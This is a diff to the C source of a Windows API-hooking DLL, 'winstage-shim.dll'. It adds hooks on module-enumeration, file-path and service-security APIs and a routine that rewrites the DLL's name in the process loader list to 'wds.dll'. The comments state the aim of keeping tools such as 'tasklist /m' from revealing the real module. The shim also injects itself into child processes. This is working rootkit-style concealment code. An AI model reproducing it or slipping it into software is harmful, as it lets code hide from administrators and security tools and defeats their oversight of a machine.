@@ -215,6 +215,9 @@ static const WsHookTarget g_targets[] = {
     WS_TARGET(GetFileInformationByHandle),
     WS_TARGET(NtQueryInformationFile), /* R11-D-13d-ntqif */
     WS_TARGET(GetFileInformationByHandleEx), /* R11-D-13d-gfibhex */
+    /* Transparency: the real path behind a handle (libuv realpath etc.). */
+    WS_TARGET(GetFinalPathNameByHandleW),
+    WS_TARGET(GetFinalPathNameByHandleA),
     WS_TARGET(NtQueryAttributesFile), /* R11-D-13d-nqaf */
     WS_TARGET(NtQueryFullAttributesFile), /* R11-D-13d-nqfaf */
     WS_TARGET(NtQueryInformationByName), /* R11-D-13d-nqifbn */
@@ -239,6 +242,13 @@ static const WsHookTarget g_targets[] = {
     WS_TARGET(QueryServiceConfigA),
     WS_TARGET(QueryServiceConfig2W),
     WS_TARGET(QueryServiceConfig2A),
+    /* R46: config2 / security descriptor were the last REAL service writes a
+     * caller could perform without touching the SCM (sc failure / sc sdset and
+     * PowerShell's Set-Service reach these, not ChangeServiceConfig). */
+    WS_TARGET(ChangeServiceConfig2W),
+    WS_TARGET(ChangeServiceConfig2A),
+    WS_TARGET(SetServiceObjectSecurity),
+    WS_TARGET(QueryServiceObjectSecurity),
     WS_TARGET(EnumServicesStatusExW),
     WS_TARGET(EnumServicesStatusExA),
     WS_TARGET(EnumServicesStatusW),
@@ -258,6 +268,24 @@ static const WsHookTarget g_targets[] = {
     WS_TARGET(ReadEventLogA),
     WS_TARGET(GetNumberOfEventLogRecords),
     WS_TARGET(CloseEventLog),
+    /* Transparency: `tasklist /m` / Get-Process -Module enumerate our own DLL. */
+    WS_TARGET(EnumProcessModules),
+    WS_TARGET(EnumProcessModulesEx),
+    WS_TARGET(K32EnumProcessModules),
+    WS_TARGET(K32EnumProcessModulesEx),
+    WS_TARGET(Module32FirstW),
+    WS_TARGET(Module32NextW),
+    WS_TARGET(Module32First),
+    WS_TARGET(Module32Next),
+    /* Cross-process module NAME (the list itself may be unfilterable). */
+    WS_TARGET(GetModuleBaseNameW),
+    WS_TARGET(GetModuleBaseNameA),
+    WS_TARGET(GetModuleFileNameExW),
+    WS_TARGET(GetModuleFileNameExA),
+    WS_TARGET(K32GetModuleBaseNameW),
+    WS_TARGET(K32GetModuleBaseNameA),
+    WS_TARGET(K32GetModuleFileNameExW),
+    WS_TARGET(K32GetModuleFileNameExA),
 };
 #define WS_TARGET_COUNT (sizeof(g_targets) / sizeof(g_targets[0]))
 
@@ -318,6 +346,7 @@ static const char *const g_targetNames[] = {
     "GetFileInformationByHandle",
     "NtQueryInformationFile", /* R11-D-13d-ntqif */
     "GetFileInformationByHandleEx", /* R11-D-13d-gfibhex */
+    "GetFinalPathNameByHandleW", "GetFinalPathNameByHandleA",
     "NtQueryAttributesFile", /* R11-D-13d-nqaf */
     "NtQueryFullAttributesFile", /* R11-D-13d-nqfaf */
     "NtQueryInformationByName", /* R11-D-13d-nqifbn */
@@ -327,11 +356,20 @@ static const char *const g_targetNames[] = {
     "DeleteService", "StartServiceW", "StartServiceA", "ControlService",
     "QueryServiceStatus", "QueryServiceStatusEx", "QueryServiceConfigW", "QueryServiceConfigA",
     "QueryServiceConfig2W", "QueryServiceConfig2A",
+    "ChangeServiceConfig2W", "ChangeServiceConfig2A",
+    "SetServiceObjectSecurity", "QueryServiceObjectSecurity",
     "EnumServicesStatusExW", "EnumServicesStatusExA", "EnumServicesStatusW", "EnumServicesStatusA",
     "CloseServiceHandle", "GetServiceDisplayNameW", "GetServiceDisplayNameA",
     "EvtClearLog", "EvtQuery", "EvtNext", "EvtClose",
     "OpenEventLogW", "OpenEventLogA", "ClearEventLogW", "ClearEventLogA",
     "ReadEventLogW", "ReadEventLogA", "GetNumberOfEventLogRecords", "CloseEventLog",
+    "EnumProcessModules", "EnumProcessModulesEx",
+    "K32EnumProcessModules", "K32EnumProcessModulesEx",
+    "Module32FirstW", "Module32NextW", "Module32First", "Module32Next",
+    "GetModuleBaseNameW", "GetModuleBaseNameA",
+    "GetModuleFileNameExW", "GetModuleFileNameExA",
+    "K32GetModuleBaseNameW", "K32GetModuleBaseNameA",
+    "K32GetModuleFileNameExW", "K32GetModuleFileNameExA",
 };
 /* R11-D-13d (v2)：调用期命中计数（与 g_targetHits 的"安装期 IAT 站点数"无关）。
  * v2 **不新增任何挂钩目标**：只统计既已挂钩入口被调用的次数。
@@ -444,6 +482,45 @@ static PPEB_LDR_DATA ws_ldr(void)
     /* x64 PEB->Ldr is at +0x18; do not depend on header field names here. */
     return *(PPEB_LDR_DATA *)((BYTE *)peb + 0x18);
 }
+
+/* ── neutral LOADER name (BaseDllName) ─────────────────────────────────────
+ *
+ * `tasklist /m` (and every tool that walks the PEB loader list, e.g. listdlls)
+ * reads the modules of a process straight out of the loader: measured on the
+ * guest, tasklist never calls EnumProcessModules, so neither the array filter
+ * nor the naming APIs can hide `winstage-shim.dll`. The base name is a separate
+ * buffer owned by the loader; overwriting it in place makes remote readers see
+ * `wds.dll` while our own path comparisons (FullDllName) keep working.
+ * Length is checked against MaximumLength, so the write can never overflow.
+ */
+static void ws_rename_loader_entry(HMODULE self)
+{
+    static const wchar_t alias[] = L"wds.dll";
+    if (!self) {
+        return;
+    }
+    PPEB_LDR_DATA ldr = ws_ldr();
+    if (!ldr) {
+        return;
+    }
+    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
+    for (LIST_ENTRY *e = head->Flink; e && e != head; e = e->Flink) {
+        WsLdrEntry *entry = (WsLdrEntry *)((BYTE *)e - offsetof(WsLdrEntry, InMemoryOrderLinks));
+        if ((HMODULE)entry->DllBase != self) {
+            continue;
+        }
+        UNICODE_STRING *bn = &entry->BaseDllName;
+        USHORT chars = (USHORT)((sizeof(alias) / sizeof(alias[0])) - 1);
+        if (!bn->Buffer || bn->MaximumLength < (USHORT)((chars + 1) * sizeof(wchar_t))) {
+            return;
+        }
+        memcpy(bn->Buffer, alias, ((size_t)chars + 1) * sizeof(wchar_t));
+        bn->Length = (USHORT)(chars * sizeof(wchar_t));
+        ws_log("loader entry base name disguised");
+        return;
+    }
+}
+
 
 static HMODULE ws_self_module(void)
 {
@@ -789,6 +866,31 @@ int ws_hook_init(void)
         { (void **)&g_orig.ReadEventLogA, "ReadEventLogA" },
         { (void **)&g_orig.GetNumberOfEventLogRecords, "GetNumberOfEventLogRecords" },
         { (void **)&g_orig.CloseEventLog, "CloseEventLog" },
+        /* R46: config2 / security descriptor + module enumeration (psapi names
+         * are absent until psapi.dll is loaded; the wrappers then resolve them
+         * lazily, so a NULL here is expected and harmless). */
+        { (void **)&g_orig.ChangeServiceConfig2W, "ChangeServiceConfig2W" },
+        { (void **)&g_orig.ChangeServiceConfig2A, "ChangeServiceConfig2A" },
+        { (void **)&g_orig.SetServiceObjectSecurity, "SetServiceObjectSecurity" },
+        { (void **)&g_orig.QueryServiceObjectSecurity, "QueryServiceObjectSecurity" },
+        { (void **)&g_orig.GetFinalPathNameByHandleW, "GetFinalPathNameByHandleW" },
+        { (void **)&g_orig.GetFinalPathNameByHandleA, "GetFinalPathNameByHandleA" },
+        { (void **)&g_orig.EnumProcessModules, "EnumProcessModules" },
+        { (void **)&g_orig.EnumProcessModulesEx, "EnumProcessModulesEx" },
+        { (void **)&g_orig.K32EnumProcessModules, "K32EnumProcessModules" },
+        { (void **)&g_orig.K32EnumProcessModulesEx, "K32EnumProcessModulesEx" },
+        { (void **)&g_orig.Module32FirstW, "Module32FirstW" },
+        { (void **)&g_orig.Module32NextW, "Module32NextW" },
+        { (void **)&g_orig.Module32First, "Module32First" },
+        { (void **)&g_orig.Module32Next, "Module32Next" },
+        { (void **)&g_orig.GetModuleBaseNameW, "GetModuleBaseNameW" },
+        { (void **)&g_orig.GetModuleBaseNameA, "GetModuleBaseNameA" },
+        { (void **)&g_orig.GetModuleFileNameExW, "GetModuleFileNameExW" },
+        { (void **)&g_orig.GetModuleFileNameExA, "GetModuleFileNameExA" },
+        { (void **)&g_orig.K32GetModuleBaseNameW, "K32GetModuleBaseNameW" },
+        { (void **)&g_orig.K32GetModuleBaseNameA, "K32GetModuleBaseNameA" },
+        { (void **)&g_orig.K32GetModuleFileNameExW, "K32GetModuleFileNameExW" },
+        { (void **)&g_orig.K32GetModuleFileNameExA, "K32GetModuleFileNameExA" },
     };
     for (size_t i = 0; i < sizeof(map) / sizeof(map[0]); i++) {
         HMODULE order[] = { g_orig.hKernelBase, g_orig.hKernel32, g_orig.hAdvapi32, g_orig.hNtdll };
@@ -818,8 +920,15 @@ int ws_hook_init(void)
                 (void *)GetProcAddress(g_orig.hNtdll, "NtQueryKey");
         }
     }
-    /* Arm child self-injection (ws_proc.c) with this module's own path. */
+    /* Arm child self-injection (ws_proc.c) with this module's own path.
+     * Order matters: GetModuleFileNameW builds the path from the loader's base
+     * name, so renaming the loader entry first made the recorded path point at
+     * `...\wds.dll` (which does not exist) and every child injection failed
+     * closed with 1114. */
     ws_proc_set_self_module(g_selfModule);
+    /* Only now disguise the loader entry: PEB-walking tools (`tasklist /m`)
+     * read this name, and it must not say `winstage-shim.dll`. */
+    ws_rename_loader_entry(g_selfModule);
     return 1;
 }
 
